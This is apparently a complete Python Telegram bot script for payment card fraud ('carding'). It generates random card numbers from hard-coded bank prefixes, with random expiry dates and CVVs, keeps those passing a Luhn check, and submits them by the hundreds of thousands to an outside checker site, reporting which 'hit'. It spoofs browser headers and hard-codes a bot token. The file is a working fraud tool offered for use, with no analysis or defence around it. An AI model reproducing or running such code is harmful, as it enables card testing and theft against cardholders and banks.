#CoDe By @ue3ex
import requests , os , telebot , user_agent , random
from telebot import types
from user_agent import generate_user_agent
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C = '\033[0;97m'
os.system('clear')
bad = 0
hit = 0
token =f'7156379447:AAE73XgHCGbEG8GSREm1rKHqjV4QRo-irMo'
os.system('clear')
print(f'{B}Go To Bot Send /start \n Then     /visa')

bot = telebot.TeleBot(token=token)
@bot.message_handler(commands=['start'])
def start(message):
	ft = message.from_user.first_name
	mas = types.InlineKeyboardMarkup(row_width=2)
	v = types.InlineKeyboardButton("⌯ Developer </>",url='https://t.me/ue3ex')
	mas.add(v)
	bot.send_message(message.chat.id,f'''* Welcome ‹!› {ft} ‹!›

— — — — — — — — — — — — — —
this checker is for checking visa cards 
send 
/visa 
to start
— — — — — — — — — — — — — —
CoDe By @ue3ex

Developer : @ue3ex
''',parse_mode="Markdown",disable_web_page_preview='True',reply_markup=mas)
@bot.message_handler(func=lambda m:True )
def visa_check(message):
	if message.text == '/visa':
		v = types.InlineKeyboardButton("⌯ coded by ue3ex </>",url='https://t.me/ue3ex')
		one = types.InlineKeyboardButton(text ="Checking one visa card (your own)",callback_data = 'c1')
		two = types.InlineKeyboardButton(text ="Checking random visa cards",callback_data = 'c2')
		mc = types.InlineKeyboardMarkup()
		mc.row_width = 1
		mc.add(one,two,v)
		bot.send_message(message.chat.id,f"""<strong>
⌯ List Checker visa •
</strong>
""",parse_mode="html",reply_markup=mc)

@bot.callback_query_handler(func=lambda call: True)
def lits_check(call):
	if call.data == 'c1':
		c1(call.message)
	if call.data == 'c2':
		c2(call.message)

def md(message):
	card = str(message.text)
	url = "https://checker.visatk.com/ccn1/alien07.php"
	headers = {
	    'authority': 'checker.visatk.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://checker.visatk.com',
    'referer': 'https://checker.visatk.com/ccn1/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	    'User-Agent': str(generate_user_agent)}
	data = {
	    'ajax': '1',
	    'do': 'check',
	    'cclist': card}
	req = requests.post(url, headers=headers, data=data).text
	if '"error":0' in req:
	    Money = req.split("[Charge :<font color=green>")[1].split("</font>] [BIN:")[0]
	    yea = (f'''⌯ Success ✅
⌯ Card : {card}
⌯ Money : {Money}

DeCoDe By @ue3ex
⌯ About me : @about_ue3ex''')
	    bot.send_message(message.chat.id,f'{yea}')
	else:
		bot.send_message(message.chat.id,f'• Bad ❌ : {card} .')
def c1(message):
	bd = bot.send_message(message.chat.id,f'• Send The Visa card.')
	bot.register_next_step_handler(bd,md)

def c2(message):
	global bad,hit
	for I in range(999999):
		saroty = '2031','2024','2023','2025','2026','2027','2028','2029','2030'
		bn = '536498','527519','483698','422061'
		sa = '01','02','03','04','05','06','10','11','12','13','14'
		Q = '0123456789'
		j = '|'
		bnn = random.choice(bn)
		rd = ''.join(random.choice(Q) for ii in range(10))
		dy = random.choice(sa)
		g = random.choice(saroty)
		pas = ''.join(random.choice(Q) for l in range(3))
		Visa = (bnn+rd+j+dy+j+g+j+pas)
		card = len(Visa)
		s = 0
		Sec = False
		for i in range(card -1, -1, -1):
			m = ord(Visa[i]) - ord('0')
			if (Sec == True):
				m=m*2
			s+=m//10
			s+=m%10
			Sec = not Sec
		if (s%10==0):
			card = Visa
			url = "https://checker.visatk.com/ccn1/alien07.php"
			headers = {
				    'authority': 'checker.visatk.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://checker.visatk.com',
    'referer': 'https://checker.visatk.com/ccn1/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
				    'User-Agent': str(generate_user_agent)}
			data = {
				    'ajax': '1',
				    'do': 'check',
				    'cclist': card}
			req = requests.post(url, headers=headers, data=data).text
			if '"error":0' in req:
			    hit +=1
			    Money = req.split("[Charge :<font color=green>")[1].split("</font>] [BIN:")[0]
			    yea = (f'''⌯ Success ✅
	⌯ Card : {card}
	⌯ Money : {Money}
	
	DeCoDe By @ue3ex
	⌯ About me : @about_ue3ex''')
			    bot.send_message(message.chat.id,f'{yea}')
			else:
				bad +=1
				mes = types.InlineKeyboardMarkup(row_width=1)
				v = types.InlineKeyboardButton("⌯ Developer </>",url='https://t.me/ue3ex')
				sarot1 = types.InlineKeyboardButton(f"• {card} .",callback_data='u8')
				sarot2 = types.InlineKeyboardButton(f"• Success ✅ : {hit} .",callback_data='u2')
				sarot3 = types.InlineKeyboardButton(f"• Bad ❌ : {bad} .",callback_data='u1')
				mes.add(sarot1,sarot2,sarot3,v)
				bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>• List information •</strong>",parse_mode='html',reply_markup=mes)
				    
		else:
			pass
	
	
bot.polling()